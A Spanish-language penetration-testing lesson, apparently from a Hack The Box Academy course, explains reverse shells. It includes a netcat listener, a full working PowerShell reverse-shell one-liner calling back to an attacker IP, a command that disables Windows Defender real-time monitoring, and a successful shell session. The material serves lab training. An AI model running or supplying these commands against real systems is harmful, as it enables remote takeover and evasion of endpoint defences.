# Reverse Shells

Con una reverse shell, la **caja de ataque** tendrá un "listener" (escucha) en ejecución, y el **objetivo** necesitará iniciar la conexión.

En muchos casos de sistemas vulnerables, es más probable que un administrador pase por alto conexiones salientes, lo que nos da una mejor oportunidad de no ser detectados. En contraste, las bind shells dependen de conexiones entrantes permitidas por el firewall del lado del servidor, lo cual es difícil de ejecutar en un entorno real.

Como se muestra en la imagen, al iniciar un "listener" para una concha inversa en nuestra caja de ataque, usamos algún método (como la carga de archivos no restringida o la inyección de comandos) para forzar que el objetivo inicie una conexión hacia nuestra caja, haciendo que la caja de ataque se convierta en el **servidor** y el objetivo en el **cliente**.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

No siempre necesitamos reinventar los payloads (comandos y código). Herramientas como el **Reverse Shell Cheat Sheet** contienen listas de comandos y generadores de shells inversas automatizadas que podemos usar en la práctica o en compromisos reales. Sin embargo, muchos administradores conocen estos recursos, por lo que podrían ajustar sus controles de seguridad para detectarlos. En algunos casos, necesitaremos personalizar nuestros ataques.

## Trabajando con una concha inversa en Windows

Vamos a establecer una concha inversa simple usando PowerShell en un objetivo Windows.

### **Caja de ataque (servidor)**

```bash
sherlock28@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Usamos el puerto 443, común para conexiones HTTPS, ya que rara vez los equipos de seguridad bloquean este puerto. Sin embargo, firewalls avanzados con inspección de paquetes y visibilidad en la capa 7 pueden detectar conchas inversas en puertos comunes.

Una vez que el objetivo Windows esté activo, conectamos usando RDP.

> **Nota:** Netcat no es nativo en Windows, por lo que no podemos contar con él directamente. Idealmente, usamos las herramientas nativas del sistema.

Podemos usar un simple **one-liner** de PowerShell para crear una concha inversa.

### **En el objetivo Windows (cliente)**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
```

El antivirus de Windows Defender bloqueó el código, como es de esperar desde el punto de vista defensivo. Desde la perspectiva ofensiva, tenemos algunos obstáculos si el antivirus está habilitado.

### **Deshabilitar el antivirus**

Podemos deshabilitar el antivirus con la siguiente línea en una consola de PowerShell administrativa:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Una vez deshabilitado, ejecutamos de nuevo el código.

### **Caja de ataque (servidor)**

```bash
sherlock28@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

Hemos establecido con éxito la concha inversa y podemos interactuar con el sistema. Intenta ejecutar algunos comandos estándar de Windows para practicar.
